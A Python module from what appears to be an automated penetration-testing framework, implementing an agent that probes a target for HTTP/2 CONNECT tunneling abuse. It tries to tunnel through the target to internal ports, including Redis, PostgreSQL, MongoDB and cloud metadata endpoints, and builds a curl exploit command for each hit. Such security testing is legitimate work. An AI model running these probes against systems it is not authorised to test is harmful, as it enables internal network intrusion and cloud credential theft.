"""
HTTP/2 CONNECT Tunneling Abuse Capability Agent for PenFlow.

Capabilities:
  - HTTP/2 CONNECT Stream Tunneling Abuse (PortSwigger Top 10 2025 #9)
  - Internal Network Port Scanning via HTTP/2 Pseudo-Header Tunnels
  - Unauthorized Internal Service Proxy Access
"""
import httpx
from typing import Dict, Any, List, Optional
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.http2_connect")

INTERNAL_TARGETS = [
    ("localhost", 8080),
    ("localhost", 8443),
    ("localhost", 3000),
    ("127.0.0.1", 6379),   # Redis
    ("127.0.0.1", 5432),   # PostgreSQL
    ("127.0.0.1", 27017),  # MongoDB
    ("169.254.169.254", 80), # AWS IMDS
    ("metadata.google.internal", 80) # GCP IMDS
]


class HTTP2ConnectCapabilityAgent(BaseCapabilityAgent):
    """
    Capability Agent probing HTTP/2 CONNECT method tunneling abuse to access internal services.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="HTTP2ConnectCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="http2_connect_tunnel", name="HTTP/2 CONNECT Tunneling Abuse", description="Detects HTTP/2 CONNECT stream tunneling abuse permitting internal port access", priority=self.priority, tags=["http2", "connect", "ssrf", "tunneling"])
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")

        http_client = context.get_http_client()
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        target_url = f"https://{context.asset}/"

        for int_host, port in INTERNAL_TARGETS:
            try:
                headers = {":authority": f"{int_host}:{port}"}
                exch = await http_client.send_as_identity(
                    identity_id="anonymous_guest",
                    method="CONNECT",
                    url=target_url,
                    headers=headers
                )
                resp = exch.response
                if resp and resp.status_code in (200, 101):
                    curl_cmd = f"curl --http2-prior-knowledge -X CONNECT -H ':authority: {int_host}:{port}' '{target_url}'"
                    exch_dict = exch.to_dict()

                    findings.append({
                        "vulnerability_type": "http2_connect_tunnel",
                        "target_url": target_url,
                        "tunneled_host": f"{int_host}:{port}",
                        "severity": "CRITICAL",
                        "confidence": 0.95,
                        "is_vulnerable": True,
                        "exploit_curl": curl_cmd,
                        "reproduction_steps": self.poc_generator.generate_reproduction_steps("HTTP/2 CONNECT Tunnel Abuse", target_url, curl_cmd),
                        "description": f"HTTP/2 CONNECT method established an unauthenticated tunnel to internal endpoint '{int_host}:{port}'.",
                        "_exchange_obj": exch_dict
                    })
                    evidence["connect_tunnel_established"] = f"{int_host}:{port}"
                    break
            except Exception as e:
                logger.debug(f"HTTP/2 CONNECT test failed for {int_host}:{port}: {e}")

        is_vuln = len(findings) > 0
        from penflow.capabilities.result import AgentExecutionResult
        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="COMPLETED",
            is_vulnerable=is_vuln,
            confidence_score=0.95 if is_vuln else 0.0,
            reasoning=findings[0]["description"] if findings else "HTTP/2 CONNECT stream tunneling correctly rejected by proxy/server.",
            target_url=target_url,
            findings=findings,
            evidence={
                "connect_tunnel_established": evidence.get("connect_tunnel_established"),
                "findings": findings,
                "evidence_exchanges": [f.get("_exchange_obj", {}) for f in findings if f.get("_exchange_obj")]
            }
        ).to_dict()

